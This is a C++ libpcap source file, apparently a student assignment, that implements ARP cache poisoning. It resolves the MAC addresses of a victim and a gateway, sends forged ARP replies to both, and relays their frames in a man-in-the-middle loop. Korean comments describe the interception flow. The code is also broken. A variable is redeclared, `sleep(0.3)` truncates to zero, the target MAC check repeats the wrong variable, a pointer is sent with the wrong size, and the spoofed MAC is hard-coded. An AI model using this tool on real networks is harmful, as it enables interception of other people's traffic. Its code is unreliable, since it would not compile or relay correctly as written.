#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getMyMac.h"

#pragma pack(push, 1)
struct EthArpPacket final 
{
	EthHdr eth_;
	ArpHdr arp_;
};
// 기존 정의된 ArpHdr로 접근하려다, mac 주소 파싱이 잘 안되어 구조체를 새로 만들었습니다...
// Mac주소 파싱용
struct Ether_ArpHeader
{
	uint8_t dst_mac[6];
	uint8_t src_mac[6];
	uint16_t eth_type;
	uint16_t hardware_t;
	uint16_t proto_t;
	uint8_t hard_len;
	uint8_t proto_len;
	uint16_t opcode;
	uint8_t senderHardAdr[6];
	uint32_t senderProtoAdr;
	uint32_t desHardAdr;
	uint32_t desProtoAdr;
};

#pragma pack(pop)

void usage() 
{
	printf("arguments error\n");
}

std::string reqArp(pcap_t* pcap, EthArpPacket pk, char* sender_ip, std::string myMac) 
{
	pk.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	pk.eth_.smac_ = Mac(myMac);
	pk.eth_.type_ = htons(EthHdr::Arp);
	pk.arp_.hrd_ = htons(ArpHdr::ETHER);
	pk.arp_.pro_ = htons(EthHdr::Ip4); 
	pk.arp_.hln_ = Mac::Size;
	pk.arp_.pln_ = Ip::Size;
	pk.arp_.op_ = htons(ArpHdr::Request);
	pk.arp_.smac_ = Mac(myMac);
	pk.arp_.sip_ = htonl(Ip("0.0.0.0"));
	pk.arp_.tmac_ = Mac("00:00:00:00:00:00");
	pk.arp_.tip_ = htonl(Ip(sender_ip));
	
	struct pcap_pkthdr* header;
	const u_char* packet;

	int res0 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pk), sizeof(EthArpPacket));
	if (res0 != 0) 
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res0, pcap_geterr(pcap));
		return "";
	}
	int res1 = pcap_next_ex(pcap, &header, &packet);
	if (res1 == PCAP_ERROR || res1 == PCAP_ERROR_BREAK) 
	{
		printf("pcap_next_ex return %d(%s)\n", res1, pcap_geterr(pcap));
		return "";
	}
	const Ether_ArpHeader *chk= (const Ether_ArpHeader*)packet;
			
	if((chk->eth_type==0x0608) && (chk->opcode==0x0200)) 
	{
		std::string macStr;
		char buf[3];
		for(int i=0; i<6; i++){
			snprintf(buf, sizeof(buf), "%02x", chk->senderHardAdr[i]); 
			//타입 문제가 자주 발생하여 GPT로 String 문자를 출력하듯 버퍼에 담는 함수를 찾아 사용하였습니다.
			macStr += buf;
			if (i != 5) macStr += ":";
		}
		return macStr; 
	}
	return "";
}

EthArpPacket attackArpTable(EthArpPacket packet, std::string sender_mac, char* sender_ip, char* target_ip)
{
	// ethernet layer
	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac("90:de:80:ce:08:09");
	packet.eth_.type_ = htons(EthHdr::Arp);
	// arp layer
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac("90:de:80:ce:08:09");
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	return packet;
}

int main(int argc, char* argv[]) 
{
	if (argc < 3) 
	{
		usage();
		return EXIT_FAILURE;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* pcap = pcap_open_live(dev, PCAP_BUF_SIZE, 1, 1, errbuf);
	if (pcap == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	std::string myMac = getMyMac(dev);

	EthArpPacket packet;

	for (int i = 0; i < (argc - 2) / 2; i++) 
	{
		char* sender_ip = argv[i * 2 + 2];
		char* target_ip = argv[i * 2 + 3];

		std::string sender_mac = reqArp(pcap, packet, sender_ip, myMac);
		if (sender_mac.empty()) 
		{
			continue;
		}
		std::cout << "target mac :: " << sender_mac << std::endl;
		sleep(0.3);
		std::string target_mac = reqArp(pcap, packet, target_ip, myMac);
		if (sender_mac.empty()) 
		{
			continue;
		}
		std::cout << "gateway mac :: " << target_mac << std::endl;

		packet = attackArpTable(packet, sender_mac, sender_ip, target_ip);		

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) 
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		sleep(0.3);
		packet = attackArpTable(packet, target_mac, target_ip, sender_ip);
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) 
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		
		while(1)
		{	
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(pcap, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
			{
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
				break;
			}
			EthHdr* eth = (EthHdr*)packet;
			if (eth->smac_ == sender_mac)
			{
				eth->smac_ = myMac;
			}
			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&eth), sizeof(packet));
			if (res != 0) 
			{
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			}
			int res = pcap_next_ex(pcap, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
			{
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
				break;
			}
			
		}

	}

	pcap_close(pcap);
}

/*
전체 FLOW

arp 테이블을 센더와 타겟 모두 변조
센더가 보내는 패킷을 받으면
이더넷 pdu 부분을 변조.

---
relay 흐름
pcap으로 송신자에 맥 어드레스를 필터링
해당 패킷에 이더넷 pdu 변조
해당 패킷을 그대로 사용하여 다시 send

pcap으로 돌아온 것을 필터링
해당 패킷을 타겟에게 센드

*/